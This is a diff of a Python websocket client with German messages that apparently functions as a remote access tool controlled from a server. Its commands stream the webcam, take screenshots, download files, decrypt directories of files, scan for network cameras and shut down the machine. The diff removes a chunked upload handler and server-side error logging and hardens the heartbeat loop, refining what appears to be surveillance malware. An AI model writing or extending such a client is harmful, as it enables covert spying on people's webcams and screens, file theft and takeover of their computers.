@@ -578,7 +578,6 @@ class WebcamStreamer:
                 if not ret:
                     await self._ws.send(json.dumps({"type": "command_output", "output": "Kein Bild von Webcam erhalten"}))
                     break
-                # Sende das Bild als base64-String (wie erwartet vom Web-UI)
                 _, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
                 b64img = base64.b64encode(buf.tobytes()).decode("utf-8")
                 meta = {"action": "webcam_frame"}
@@ -612,10 +611,13 @@ def shutdown_or_restart(action):
         return f"Fehler beim Ausführen von {action}: {e}"
 
 # --- Heartbeat/Ping ---
-async def heartbeat(ws):
+async def heartbeat(ws, interval=60):
     while True:
-        await ws.send_json({"type": "ping"})
-        await asyncio.sleep(60)
+        try:
+            await ws.send(json.dumps({"type": "ping"}))
+        except Exception:
+            break
+        await asyncio.sleep(interval)
 
 # === Hauptlogik: Kommandos ===
 async def process_commands(websocket):
@@ -701,11 +703,6 @@ async def process_commands(websocket):
                     response["status"] = "error"
                     response["type"] = "command_output"
                     response["output"] = f"Fehler beim Screenshot: {e}"
-                    await websocket.send(json.dumps({
-                        "type": "client_log",
-                        "level": "error",
-                        "msg": f"Screenshot-Fehler: {e}"
-                    }))
 
             elif action == "download":
                 path = command.get("path")
@@ -786,41 +783,6 @@ async def process_commands(websocket):
                     response["output"] = f"Entschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}."
                 except Exception as e:
                     response["output"] = f"Fehler bei Entschlüsselung: {e}"
-            elif action == "upload_chunk":
-                file_id = command.get("file_id")
-                chunk_index = command.get("chunk_index")
-                total_chunks = command.get("total_chunks")
-                filename = command.get("filename")
-                data_b64 = command.get("data")
-                original_filename = command.get("original_filename")
-                filesize = command.get("filesize")
-                if file_id not in CHUNKED_UPLOADS:
-                    temp_path = tempfile.NamedTemporaryFile(delete=False).name
-                    CHUNKED_UPLOADS[file_id] = {
-                        "path": temp_path,
-                        "received": set(),
-                        "total": total_chunks,
-                        "filename": filename,
-                        "original_filename": original_filename,
-                        "filesize": filesize,
-                    }
-                upload = CHUNKED_UPLOADS[file_id]
-                with open(upload["path"], "ab") as f:
-                    f.write(base64.b64decode(data_b64))
-                upload["received"].add(chunk_index)
-                if len(upload["received"]) == total_chunks:
-                    try:
-                        shutil.move(upload["path"], filename)
-                        msg = f"Datei erfolgreich gespeichert: {filename} ({filesize} Bytes, {total_chunks} Chunks)"
-                        del CHUNKED_UPLOADS[file_id]
-                    except Exception as e:
-                        msg = f"Fehler beim Speichern der Datei: {e}"
-                    response = {"type": "command_output", "output": msg}
-                    await websocket.send(json.dumps(response))
-                else:
-                    response = {"type": "debug", "msg": f"Chunk {chunk_index+1}/{total_chunks} empfangen für {filename}"}
-                    await websocket.send(json.dumps(response))
-                continue
             elif action == "scan_cameras":
                 cams = scan_network_cameras()
                 response["type"] = "command_output"
@@ -835,11 +797,6 @@ async def process_commands(websocket):
             error_response = {"status": "error", "error": f"Client-Fehler: {e}"}
             try:
                 await websocket.send(json.dumps(error_response))
-                await websocket.send(json.dumps({
-                    "type": "client_log",
-                    "level": "error",
-                    "msg": f"Client-Fehler: {e}"
-                }))
             except Exception as e2:
                 print(f"[Client] Fehler beim Senden des Fehler-Responses: {e2}")
 
@@ -870,7 +827,6 @@ async def connect_to_server():
                         }))
                 except Exception as e:
                     logging.warning(f"Fehler beim Senden von Systeminfos: {e}")
-                # Starte Heartbeat
                 asyncio.create_task(heartbeat(websocket, 60))
                 await process_commands(websocket)
                 backoff = 5
